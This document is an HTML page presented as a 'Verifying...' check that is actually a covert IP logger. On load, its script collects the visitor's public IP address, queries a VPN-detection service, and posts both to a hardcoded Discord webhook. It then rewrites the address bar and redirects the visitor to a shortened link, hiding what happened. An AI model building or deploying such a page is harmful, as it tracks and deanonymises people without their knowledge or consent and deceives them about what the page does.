<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Verification</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Arial', sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        h1 {
            font-size: 30px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <h1>Verifying...</h1>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
        const REDIRECT_URL = "https://is.gd/gwuu9c";

        async function getIPv4() {
            try {
                const response = await fetch("https://api4.ipify.org?format=json");
                if (!response.ok) throw new Error("Failed to fetch IPv4");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IPv4:", error);
                return null;
            }
        }

        async function sendToWebhook(ip, isVPN) {
            try {
                const payload = {
                    content: `New Visitor IPv4: ${ip}\nVPN Detected: ${isVPN ? 'Yes' : 'No'}`
                };
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("Error sending data to webhook:", error);
            }
        }

        async function checkVPN(ip) {
            // Example: Use a VPN detection API to check for VPNs or proxies (you need to replace with a real API key)
            try {
                const response = await fetch(`https://vpnapi.io/api/${ip}?key=your_api_key`);
                const data = await response.json();
                return data.vpn || false; // Return true if VPN detected, false if not
            } catch (error) {
                console.error("Error checking VPN:", error);
                return false; // Default to false if we can't check VPN
            }
        }

        (async function () {
            // Fetch IP address
            const ip = await getIPv4();
            if (!ip) return;  // If no IP was retrieved, abort

            // Check if the IP is from a VPN
            const isVPN = await checkVPN(ip);

            // Send data to the webhook
            await sendToWebhook(ip, isVPN);

            // Immediately redirect while replacing the URL in the address bar
            history.replaceState(null, '', REDIRECT_URL); // Replaces the current URL with the REDIRECT_URL
            window.location.href = REDIRECT_URL; // Redirects immediately
        })();
    </script>

</body>
</html>
